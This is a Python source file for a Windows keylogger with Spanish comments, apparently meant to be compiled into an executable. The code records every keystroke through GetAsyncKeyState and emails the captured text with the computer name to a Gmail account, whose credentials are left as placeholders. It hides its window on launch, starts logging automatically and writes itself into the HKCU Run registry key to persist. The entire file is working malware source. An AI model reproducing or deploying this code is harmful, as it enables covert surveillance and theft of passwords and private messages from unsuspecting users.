# C:\Users\User\AppData\Roaming\Python\Python312\Scripts\auto-py-to-exe.exe
#Ejecutar para Compilar

import platform
import ctypes
import threading
import smtplib
from email.mime.text import MIMEText
import sys
import winreg
import os
import time
import tkinter as tk
from tkinter import messagebox


user32 = ctypes.windll.user32

class Keylogger:
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True
        self.frequency = 30
        self.ctrl_pressed = False
        self.shift_pressed = False
        self.alt_pressed = False
        self.caps_lock_on = False

    def get_computer_name(self):
        return os.environ.get('COMPUTERNAME', 'Desconocido')

    def set_frequency(self, frequency):
        self.frequency = frequency
        if self.timer:
            self.timer.cancel()
            self.report()

    def pressed_key(self, key_code):
        special_keys = {
            13: "\n", 32: " ", 9: "\t", 27: "Esc ", 37: "\u2190 ", 38: "\u2191 ",
            39: "\u2192 ", 40: "\u2193 ", 46: "Supr ", 91: "Win ", 92: "Win ",
            112: "F1 ", 113: "F2 ", 114: "F3 ", 115: "F4 ", 116: "F5 ",
            117: "F6 ", 118: "F7 ", 119: "F8 ", 120: "F9 ", 121: "F10 ",
            122: "F11 ", 123: "F12 "
        }
        if key_code == 8:
            self.log += '<← Borrado>'
        elif key_code in special_keys:
            self.log += special_keys[key_code]
        elif 65 <= key_code <= 90:  # Letras del alfabeto (A-Z)
            char = chr(key_code)
            if not (self.shift_pressed or self.caps_lock_on):
                char = char.lower()
            self.log += char
        elif key_code == 20:  # Caps Lock
            self.caps_lock_on = not self.caps_lock_on
            char = ""
            self.log += "MAYUSCULAS --> " + ("ACTIVADAS" if self.caps_lock_on else "desactivadas")
        elif 48 <= key_code <= 57:  # Números del teclado alfabético (0-9)
            shift_specials = ")!@#$%^&*("
            self.log += shift_specials[key_code - 48] if self.shift_pressed else chr(key_code)
        elif key_code == 16:
            self.shift_pressed = True
        elif key_code == 17:
            self.ctrl_pressed = True
        elif key_code == 18:
            self.alt_pressed = True

        if key_code not in (16, 17, 18):
            self.shift_pressed = False
            self.ctrl_pressed = False
            self.alt_pressed = False

    def get_logs(self):
        return self.log

    def clear_logs(self):
        self.log = ""

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

    def report(self):
        if self.is_first_run or len(self.log) > 1024:
            computer_name = self.get_computer_name()
            email_body = f"Keylogger Iniciado en {computer_name}" if self.is_first_run else f"{self.log}\n\nPC: {computer_name}"
            time.sleep(30)
            self.send_email("Reporte Mail", email_body, "xxxxx", ["xxxxx"], "xxxxxx")
            self.log = ""
            self.is_first_run = False
        if not self.request_shutdown:
            self.timer = threading.Timer(self.frequency, self.report)
            self.timer.start()

    def key_logger_loop(self):
        while not self.request_shutdown:
            for key_code in range(1, 256):
                if user32.GetAsyncKeyState(key_code) & 0x0001:
                    self.pressed_key(key_code)

    def shutdown(self):
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()

    def start(self):
        threading.Thread(target=self.key_logger_loop, daemon=True).start()
        self.report()

    def add_to_startup(self):
        try:
            exe_path = sys.argv[0]
            reg_key = winreg.HKEY_CURRENT_USER
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg_value_name = "Path_Keys_App"

            with winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, reg_value_name, 0, winreg.REG_SZ, exe_path)
        finally:
            pass

class KeyloggerUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Path_Keys")
        self.root.geometry("400x300")
        self.root.withdraw()  # Oculta la ventana al inicio

        self.keylogger = Keylogger()

        self.start_button = tk.Button(self.root, text="Iniciar", command=self.start_keylogger)
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(self.root, text="Detener", command=self.stop_keylogger)
        self.stop_button.pack(pady=10)

        self.view_logs_button = tk.Button(self.root, text="Ver Logs", command=self.view_logs)
        self.view_logs_button.pack(pady=10)

        self.add_to_startup_button = tk.Button(self.root, text="Añadir al inicio", command=self.keylogger.add_to_startup)
        self.add_to_startup_button.pack(pady=10)

        self.text_area = tk.Text(self.root, wrap=tk.WORD, height=10, width=40)
        self.text_area.config(state=tk.DISABLED)
        self.text_area.pack(pady=10)

    def start_keylogger(self):
        self.keylogger.start()
        self.text_area.config(state=tk.NORMAL)
        self.text_area.insert(tk.END, "[+] Keylogger iniciado.\n")
        self.text_area.config(state=tk.DISABLED)

    def stop_keylogger(self):
        self.keylogger.shutdown()
        self.text_area.config(state=tk.NORMAL)
        self.text_area.insert(tk.END, "[-] Keylogger detenido.\n")
        self.text_area.config(state=tk.DISABLED)

    def view_logs(self):
        logs = self.keylogger.get_logs()
        self.text_area.config(state=tk.NORMAL)
        self.text_area.delete(1.0, tk.END)
        self.text_area.insert(tk.END, logs if logs else "No hay logs disponibles.\n")
        self.text_area.config(state=tk.DISABLED)

def main():
    root = tk.Tk()
    app = KeyloggerUI(root)

    # Iniciar el keylogger automáticamente al iniciar la aplicación
    app.start_keylogger()

    # Agregar al inicio automáticamente
    app.keylogger.add_to_startup()

    # Iniciar la aplicación en segundo plano
    root.mainloop()

if __name__ == "__main__":
    main()
